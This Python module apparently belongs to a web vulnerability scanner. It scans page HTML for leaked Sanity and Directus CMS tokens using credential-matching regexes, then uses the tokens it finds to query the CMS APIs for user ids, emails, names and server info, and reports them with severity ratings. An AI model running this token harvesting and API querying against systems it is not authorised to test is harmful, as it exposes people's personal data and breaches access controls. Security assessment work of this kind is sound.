#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sanity and Directus token discovery and API abuse."""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Tuple
from urllib.parse import quote

from lib.scanner.http.vibe_secrets_probe import mask_secret

_SANITY_TOKEN_RE = re.compile(r"\bsk[A-Za-z0-9]{20,}\b")
_SANITY_PROJECT_RE = re.compile(
    r"(?i)(?:SANITY_(?:PROJECT_ID|STUDIO_API_PROJECT_ID|DATASET)|projectId)\s*[=:]\s*['\"]([^'\"]+)['\"]",
)
_DIRECTUS_TOKEN_RE = re.compile(
    r"(?i)(?:DIRECTUS_(?:TOKEN|STATIC_TOKEN|API_TOKEN)|directus_token)\s*[=:]\s*['\"]([^'\"]+)['\"]",
)
_DIRECTUS_URL_RE = re.compile(
    r"(?i)(?:DIRECTUS_(?:URL|BASE_URL)|NEXT_PUBLIC_DIRECTUS_URL)\s*[=:]\s*['\"]([^'\"]+)['\"]",
)


def discover_headless_cms_credentials(text: str) -> Dict[str, str]:
    creds: Dict[str, str] = {}
    body = text or ""
    for match in _SANITY_PROJECT_RE.finditer(body):
        val = match.group(1).strip()
        if val not in ("production", "development") and len(val) < 40:
            creds.setdefault("sanity_project_id", val)
    for match in re.finditer(
        r"(?i)SANITY_(?:DATASET|STUDIO_API_DATASET)\s*[=:]\s*['\"]([^'\"]+)['\"]",
        body,
    ):
        creds["sanity_dataset"] = match.group(1).strip()
    for match in _SANITY_TOKEN_RE.finditer(body):
        if "sanity" in body.lower() or creds.get("sanity_project_id"):
            creds["sanity_token"] = match.group(0)
    for match in _DIRECTUS_TOKEN_RE.finditer(body):
        creds["directus_token"] = match.group(1).strip()
    for match in _DIRECTUS_URL_RE.finditer(body):
        creds["directus_url"] = match.group(1).strip().rstrip("/")
    for match in re.finditer(r"https://([a-z0-9-]+)\.api\.sanity\.io", body, re.I):
        creds.setdefault("sanity_project_id", match.group(1))
    return creds


def enum_sanity_groq(
    session,
    project_id: str,
    token: str,
    dataset: str = "production",
    *,
    verify_ssl: bool = True,
) -> Dict[str, Any]:
    query = quote('*[_type match "user*" || _type match "*author*"][0..5]{_id, email, name}')
    url = f"https://{project_id}.api.sanity.io/v2021-06-07/data/query/{dataset}?query={query}"
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    try:
        response = session.get(url, headers=headers, timeout=12, verify=verify_ssl)
    except Exception as exc:
        return {"platform": "sanity", "ok": False, "detail": str(exc)}
    if response.status_code == 401:
        return {"platform": "sanity", "ok": False, "detail": "token_rejected"}
    if response.status_code != 200:
        return {"platform": "sanity", "ok": False, "detail": f"http_{response.status_code}"}
    try:
        data = response.json()
    except Exception:
        return {"platform": "sanity", "ok": False, "detail": "invalid_json"}
    result = data.get("result") if isinstance(data, dict) else []
    return {
        "platform": "sanity",
        "ok": True,
        "kind": "sanity_groq_query",
        "project_id": project_id,
        "dataset": dataset,
        "result_count": len(result or []),
        "preview": json.dumps(result or [])[:400],
        "severity": "critical" if result else "high",
    }


def enum_directus_users(
    session,
    base_url: str,
    token: str,
    *,
    verify_ssl: bool = True,
) -> Dict[str, Any]:
    base = base_url.rstrip("/")
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    for path in ("/users", "/items/users", "/server/info"):
        url = f"{base}{path}"
        try:
            response = session.get(url, headers=headers, params={"limit": 5}, timeout=12, verify=verify_ssl)
        except Exception as exc:
            return {"platform": "directus", "ok": False, "detail": str(exc)}
        if response.status_code == 401:
            return {"platform": "directus", "ok": False, "detail": "token_rejected"}
        if response.status_code != 200:
            continue
        body = str(getattr(response, "text", "") or "")
        try:
            data = response.json()
        except Exception:
            data = {}
        users = data.get("data") if isinstance(data, dict) else data
        if path == "/server/info":
            return {
                "platform": "directus",
                "ok": True,
                "kind": "directus_server_info",
                "preview": body[:400],
                "severity": "high",
            }
        if isinstance(users, list) and users:
            samples = [
                {
                    "email": str(u.get("email") or ""),
                    "id": str(u.get("id") or ""),
                }
                for u in users[:5]
                if isinstance(u, dict)
            ]
            return {
                "platform": "directus",
                "ok": True,
                "kind": "directus_users_listed",
                "path": path,
                "sample_users": samples,
                "severity": "critical",
            }
    return {"platform": "directus", "ok": False, "detail": "no_accessible_endpoint"}


def enumerate_headless_cms(
    session,
    homepage_html: str,
    *,
    verify_ssl: bool = True,
    target_base: str = "",
    sanity_project: str = "",
    sanity_token: str = "",
    sanity_dataset: str = "",
    directus_url: str = "",
    directus_token: str = "",
) -> Tuple[List[Dict[str, Any]], Dict[str, str]]:
    creds = discover_headless_cms_credentials(homepage_html or "")
    if sanity_project:
        creds["sanity_project_id"] = sanity_project
    if sanity_token:
        creds["sanity_token"] = sanity_token
    if sanity_dataset:
        creds["sanity_dataset"] = sanity_dataset
    if directus_url:
        creds["directus_url"] = directus_url
    elif target_base:
        creds.setdefault("directus_url", target_base.rstrip("/"))
    if directus_token:
        creds["directus_token"] = directus_token

    findings: List[Dict[str, Any]] = []
    sid = creds.get("sanity_project_id") or ""
    stok = creds.get("sanity_token") or ""
    dataset = creds.get("sanity_dataset") or "production"
    if sid and stok:
        hit = enum_sanity_groq(session, sid, stok, dataset, verify_ssl=verify_ssl)
        hit["token_masked"] = mask_secret(stok)
        findings.append(hit)

    durl = creds.get("directus_url") or ""
    dtok = creds.get("directus_token") or ""
    if durl and dtok:
        hit = enum_directus_users(session, durl, dtok, verify_ssl=verify_ssl)
        hit["token_masked"] = mask_secret(dtok)
        findings.append(hit)

    return findings, creds


__all__ = [
    "discover_headless_cms_credentials",
    "enumerate_headless_cms",
    "enum_directus_users",
    "enum_sanity_groq",
]
